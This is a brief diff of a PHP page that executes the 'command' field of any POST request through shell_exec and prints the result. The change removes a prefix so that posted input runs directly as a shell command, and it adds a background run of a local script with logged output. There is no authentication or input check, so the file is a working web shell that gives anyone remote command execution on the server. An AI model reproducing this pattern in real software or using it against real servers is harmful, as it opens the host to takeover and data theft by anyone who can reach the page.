@@ -6,10 +6,12 @@ error_reporting( E_ALL );
 
 $command = $_POST['command'];
 echo "<pre>";
-echo shell_exec('sh' . $command);
+echo shell_exec($command);
 echo "</pre>";
 
-echo shell_exec('sh /home/hugo76113/script.sh');
+shell_exec('sh /home/hugo76113/script.sh');
+
+shell_exec('sh /home/hugo76113/script.sh > /home/scripts/log.txt &');
 
 
 ?>
